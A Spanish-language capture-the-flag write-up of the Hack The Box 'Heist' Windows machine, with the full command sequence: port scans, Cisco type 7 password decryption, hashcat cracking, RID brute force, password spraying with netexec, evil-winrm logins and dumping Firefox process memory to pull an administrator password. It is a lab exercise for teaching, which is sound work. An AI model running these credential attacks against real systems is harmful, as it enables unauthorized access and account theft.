# Heist

![](../../../../~gitbook/image.md)Publicado: 19 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Heist es una máquina Windows de dificultad Easy que simula un escenario de soporte técnico donde un usuario comparte inadvertidamente un archivo de configuración de un router Cisco que contiene credenciales cifradas. La explotación implica:- Reconocimiento inicial: Identificación de servicios web y SMB
- Obtención de credenciales: Descifrado de contraseñas Cisco tipo 7 y cracking de hashes MD5
- Enumeración lateral: Reutilización de credenciales para acceso SMB y WinRM
- Escalada de privilegios: Extracción de credenciales de memoria del proceso Firefox mediante volcado de memoria
La máquina destaca la importancia de no compartir archivos de configuración y demuestra técnicas de análisis forense de memoria para la obtención de credenciales.
### 🎯 Resumen
AspectoDetalleSOWindows ServerServicios principalesHTTP (80), SMB (445), WinRM (5985)Vector de entradaCredenciales expuestas en archivo de configuraciónEscaladaVolcado de memoria del proceso FirefoxFlags obtenidasuser.txt, root.txt
### 🔭 Reconocimiento

#### 🏓 Verificación de conectividad
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### 🔍 Escaneo de puertos

#### 🔧 Enumeración de servicios

### 🌐 Enumeración Web

#### 🔗 Puerto 80 - Support Login Page
Al acceder al servicio HTTP encontramos un panel de login de un servicio destinado a soporte técnico.![](../../../../~gitbook/image.md)
#### 🎫 Acceso como invitado
La aplicación permite iniciar sesión como invitado, lo que nos da acceso a un chat de asistencia donde un usuario llamado Hazard comparte un archivo de configuración sensible:![](../../../../~gitbook/image.md)
### 🔓 Análisis de credenciales

#### 📄 Archivo de configuración Cisco IOS
El contenido del archivo adjunto revela ser una configuración de router Cisco IOS:
#### 🔐 Descifrado de contraseñas Cisco Tipo 7
Las contraseñas Cisco Tipo 7 utilizan un cifrado muy débil que puede ser fácilmente revertido:Método 1: Herramienta cisco-decryptMétodo 2: Herramienta online- URL: https://www.ifm.net.nz/cookbooks/passwordcracker.html
![](../../../../~gitbook/image.md)Credenciales obtenidas:- `admin:Q4)sJu\Y8qz*A3?d`
- `rout3r:stealth1agent`

#### 🥷 Cracking del hash MD5
Utilizamos hashcat para crackear el hash:![](../../../../~gitbook/image.md)Credencial obtenida: `rout3r:stealth1agent`
### 🔍 Enumeración de usuarios y servicios

#### 🧪 Verificación de credenciales
Probamos las credenciales obtenidas contra varios servicios, pero no funcionan directamente. Sin embargo, considerando el contexto del chat donde Hazard solicita una cuenta, probamos si reutilizó alguna contraseña:![](../../../../~gitbook/image.md)✅ ¡Éxito! Las credenciales `hazard:stealth1agent` son válidas para SMB.
#### 👥 Enumeración de usuarios mediante RID Brute Force
![](../../../../~gitbook/image.md)
#### 📋 Automatización de la extracción de usuarios
Para automatizar el proceso, extraemos y limpiamos la lista de usuarios:![](../../../../~gitbook/image.md)
#### 🎯 Password Spraying
Creamos lista de contraseñas:Verificación contra SMB:![](../../../../~gitbook/image.md)Verificación contra WinRM:![](../../../../~gitbook/image.md)Credenciales válidas encontradas:- SMB: `Chase:Q4)sJu\Y8qz*A3?d`
- WinRM: `Chase:Q4)sJu\Y8qz*A3?d`

### 🚪 Acceso inicial

#### 🔑 Conexión WinRM
![](../../../../~gitbook/image.md)Una vez dentro como Chase, obtenemos la primera flag en el directorio Desktop
#### 🏁 Primera flag

#### 📝 Análisis del archivo todo.txt
![](../../../../~gitbook/image.md)El archivo `todo.txt` revela información importante:- Chase consulta regularmente el sitio web para ver la lista de problemas
- Configuración de la copia de seguridad del router
- El usuario invitado tiene acceso limitado comparado con `admin@support.htb`

### 🔬 Análisis de la memoria
El único proceso relacionado con un navegador que vemos en el sistema es firefox. SI queremos intentar capturar credenciales, podemos usar la herramienta `procdump64.exe`
https://live.sysinternals.com/ y subirla con el comando upload de evil-winrm:
#### 🛠️ Preparación de herramientas
Descarga de ProcDump:Subida a la máquina objetivo:
#### 💾 Volcado de memoria
Aceptación de licencia:Generación del dump:Descarga del archivo:
### 🕵️ Extracción de credenciales

#### 🔍 Análisis del volcado de memoria
Ahora podemos usar el comando strings en combinación con grep para filtrar por posibles cadenas que contengan la palabra "password", "login" o "login_password":Resultado:Credenciales del administrador: `Administrator:4dD!5}x/re8]FBuZ`
### 👑 Escalada de privilegios
Usamos las credenciales obtenidas y evil-winrm par autenticarnos como Administrador y obtenemos la flag:
#### 🔐 Acceso como Administrator

#### 🏆 Flag de root

- [🎯 Resumen](#resumen)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [🔓 Análisis de credenciales](#analisis-de-credenciales)
- [🚪 Acceso inicial](#acceso-inicial)
- [🔬 Análisis de la memoria](#analisis-de-la-memoria)
- [🕵️ Extracción de credenciales](#extraccion-de-credenciales)
- [👑 Escalada de privilegios](#escalada-de-privilegios)

```
❯ ping -c2 10.10.10.149
PING 10.10.10.149 (10.10.10.149) 56(84) bytes of data.
64 bytes from 10.10.10.149: icmp_seq=1 ttl=127 time=60.6 ms
64 bytes from 10.10.10.149: icmp_seq=2 ttl=127 time=47.9 ms

--- 10.10.10.149 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1009ms
rtt min/avg/max/mdev = 47.929/54.259/60.590/6.330 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.149 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
80,135,445,5985,49669
```

```
nmap -sC -sV -p$ports 10.10.10.149 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-19 09:38 CEST
Nmap scan report for 10.10.10.149
Host is up (0.047s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-06-19T07:39:22
|_  start_date: N/A
```

```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
synchronization
bgp log-neighbor-changes
bgp dampening
network 192.168.0.0Â mask 300.255.255.0
timers bgp 3 9
redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
session-timeout 600
authorization exec SSH
transport input ssh
```

```
# Contraseña del usuario admin
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408

# Contraseña del usuario rout3r
username rout3r password 7 0242114B0E143F015F5D1E161713
```

```
pip install cisco-decrypt
cisco-decrypt 02375012182C1A1D751618034F36415408
cisco-decrypt 0242114B0E143F015F5D1E161713
```

```
# Hash enable secret tipo 5 (MD5)
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
```

```
hashcat -m 500 -a 0 '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' /usr/share/wordlists/rockyou.txt
```

```
netexec smb 10.10.10.149 -u hazard -p 'stealth1agent'
```

```
netexec smb 10.10.10.149 -u hazard -p 'stealth1agent' --rid-brute
```

```
netexec smb 10.10.10.149 -u 'hazard' -p 'stealth1agent' --rid-brute 2>/dev/null | awk -F '\\' '{print $2}' | grep 'SidTypeUser' | sed 's/ (SidTypeUser)//' > Users.txt
```

```
echo -e "stealth1agent\nQ4)sJu\\Y8qz*A3?d" > Passwords.txt
```

```
netexec smb 10.10.10.149 -u Users.txt -p Passwords.txt --continue-on-success 2>/dev/null
```

```
netexec winrm 10.10.10.149 -u Users.txt -p Passwords.txt --continue-on-success 2>/dev/null
```

```
evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
```

```
*Evil-WinRM* PS C:\Users\Chase\Desktop> dir

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2019   9:08 AM            121 todo.txt
-ar---        6/19/2025   1:01 PM             34 user.txt

*Evil-WinRM* PS C:\Users\Chase\Desktop> type user.txt
[FLAG_CONTENT]
```

```
get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
466      18     2276       5420               368   0 csrss
287      13     1904       5000               480   1 csrss
357      15     3428      14564              4024   1 ctfmon
255      14     3964      13296              3880   0 dllhost
166       9     1856       9744       0.02   6696   1 dllhost
614      32    30356      58308               964   1 dwm
1491      58    24032      78364              4708   1 explorer
1051      71   153576     230984       5.38   6352   1 firefox
347      19    10192      35488       0.05   6460   1 firefox
401      34    35584      95864       0.61   6624   1 firefox
378      28    22932      60100       0.31   6900   1 firefox
355      25    16408      38924       0.11   7140   1 firefox
```

```
### 🦊 Identificación del proceso Firefox

```powershell
*Evil-WinRM* PS C:\Temp> get-process -name firefox

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
1051      71   153576     230984       5.38   6352   1 firefox
347      19    10192      35488       0.05   6460   1 firefox
401      34    35584      95864       0.61   6624   1 firefox
378      28    22932      60100       0.31   6900   1 firefox
355      25    16408      38924       0.11   7140   1 firefox
```

```
wget https://live.sysinternals.com/procdump64.exe
```

```
*Evil-WinRM* PS C:\Temp> upload procdump64.exe
```

```
*Evil-WinRM* PS C:\Temp> .\procdump64.exe -accepteula
```

```
*Evil-WinRM* PS C:\Users\Chase\Desktop> .\procdump64.exe -ma 7140 firefox.dmp
```

```
*Evil-WinRM* PS C:\Users\Chase\Desktop> download firefox.dmp
```

```
strings firefox.dmp | grep login_password
```

```
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

```
evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
supportdesk\administrator
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/19/2025   1:01 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[FLAG_CONTENT]
```
